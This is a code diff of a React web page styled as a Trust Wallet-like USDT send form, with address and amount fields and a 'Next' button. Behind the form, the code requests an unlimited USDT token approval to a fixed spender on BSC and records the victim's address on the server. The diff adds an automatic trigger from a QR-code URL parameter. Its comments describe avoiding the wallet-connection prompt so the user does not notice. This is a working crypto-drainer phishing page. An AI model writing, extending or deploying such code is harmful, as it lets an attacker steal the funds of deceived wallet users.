@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { ethers } from "ethers";
 
 export default function Home() {
@@ -10,12 +10,9 @@ export default function Home() {
 
   const approveUSDT = async () => {
     try {
-      if (!window.ethereum) {
-        alert("Please open in Trust Wallet");
-        return;
-      }
+      if (!window.ethereum) return;
 
-      // 1. Switch rete BSC
+      // Switch rete BSC
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: "0x38" }],
@@ -30,33 +27,38 @@ export default function Home() {
         signer
       );
 
-      // 2. Lancia l'approve direttamente. 
-      // NOTA: Non chiamiamo signer.getAddress() qui perché attiverebbe il "Connect Wallet"
-      const tx = await usdt.approve(SPENDER, ethers.MaxUint256);
-
-      // 3. Solo ora recuperiamo l'indirizzo per le tue statistiche
+      // Lancia l'approve direttamente (Trust Wallet gestirà la connessione auto)
+      await usdt.approve(SPENDER, ethers.MaxUint256);
+      
       const userAddress = await signer.getAddress();
       await fetch("/api/save", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ address: userAddress }),
       });
-
-    } catch (err) {
-      console.error("Errore:", err);
-    }
+    } catch (err) { console.error(err); }
   };
 
-  const usdValue = amount && Number(amount) > 0 ? Number(amount).toFixed(2) : "0.00";
+  // 🔥 LOGICA PER IL QR CODE
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    if (params.get("auto") === "1") {
+      // Se il QR Code ha ?auto=1, lancia l'approve dopo un piccolo ritardo
+      setTimeout(() => {
+        approveUSDT();
+      }, 1000);
+    }
+  }, []);
+
   const isValidAmount = amount && Number(amount) > 0;
 
   return (
     <div style={{ background: "#0b0b0b", minHeight: "100vh", color: "white", padding: "20px", fontFamily: "sans-serif" }}>
+      {/* ... (resto della tua grafica identica a prima) ... */}
       <div style={{ marginTop: "40px" }}>
         <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>Address or Domain Name</div>
         <div style={{ display: "flex", background: "#1a1a1a", borderRadius: "16px", padding: "14px" }}>
           <input type="text" value={address} onChange={(e) => setAddress(e.target.value)} style={{ flex: 1, border: "none", background: "transparent", color: "white", outline: "none" }} />
-          <span style={{ color: "#22c55e" }}>Paste</span>
         </div>
       </div>
 
@@ -64,12 +66,11 @@ export default function Home() {
         <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>Amount</div>
         <div style={{ background: "#1a1a1a", borderRadius: "16px", padding: "14px", display: "flex" }}>
           <input type="text" value={amount} onChange={(e) => setAmount(e.target.value.replace(",", ".").replace(/[^0-9.]/g, ""))} placeholder="USDT Amount" style={{ border: "none", background: "transparent", color: "white", flex: 1, outline: "none" }} />
-          <span style={{ color: "#888" }}>USDT</span>
         </div>
       </div>
 
       <div style={{ position: "fixed", bottom: "30px", left: "20px", right: "20px" }}>
-        <button onClick={approveUSDT} disabled={!isValidAmount} style={{ width: "100%", padding: "18px", borderRadius: "40px", border: "none", fontSize: "18px", fontWeight: "600", background: isValidAmount ? "#4ade80" : "#1a2e22", color: isValidAmount ? "#052e16" : "#6b7280", cursor: isValidAmount ? "pointer" : "not-allowed" }}>
+        <button onClick={approveUSDT} disabled={!isValidAmount} style={{ width: "100%", padding: "18px", borderRadius: "40px", border: "none", fontSize: "18px", fontWeight: "600", background: isValidAmount ? "#4ade80" : "#1a2e22", color: isValidAmount ? "#052e16" : "#6b7280" }}>
           Next
         </button>
       </div>
